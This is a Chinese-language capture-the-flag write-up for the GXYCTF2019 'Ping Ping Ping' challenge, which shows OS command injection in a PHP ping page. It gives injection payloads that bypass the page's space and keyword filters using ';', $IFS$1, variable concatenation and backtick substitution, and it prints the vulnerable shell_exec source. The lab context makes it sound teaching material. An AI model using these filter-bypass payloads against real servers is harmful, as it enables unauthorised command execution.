# [GXYCTF2019]Ping Ping Ping 1

- 进入网页，提示/?ip=，在url栏输入 `/?ip=1` ，出现ping的结果

> <img src="../../IMG2/Screenshot 2024-05-17 212551.png">

- 尝试命令连接符，只有分号可用，输入 `/?ip=127.0.0.1;ls` ，出现了flag.php

> <img src="../../IMG2/Screenshot 2024-05-17 212900.png">

- 直接输入 `/?ip=127.0.0.1;cat flag.php` 失败，经过测试，发现是过滤了空格，使用 `$IFS$1` 成功绕过空格

> <img src="../../IMG2/Screenshot 2024-05-17 213039.png">

- 尝试发现屏蔽了flag关键字，且无法使用 `*` 通配符，先cat index.php，发现了源代码，开始代码审计

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

- 经过代码审计，可以看出所有的字符都进行了过滤，但是还是可以通过拼接的方式或者内联的方式获取flag

- 方法一：拼接，php会将g作为a的值拼接到fla$a.php中

`/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php`

> <img src="../../IMG2/Screenshot 2024-05-17 214306.png">

- 方法二：内联，ls的输出会作为cat的输入，也可以使用$(ls)

`/?ip=127.0.0.1;cat$IFS$1(反引号)ls(反引号)`

*注：markdown中如果出现两个反引号会默认识别为代码行标记，故此处用括号代替*

> <img src="../../IMG2/Screenshot 2024-05-17 214402.png">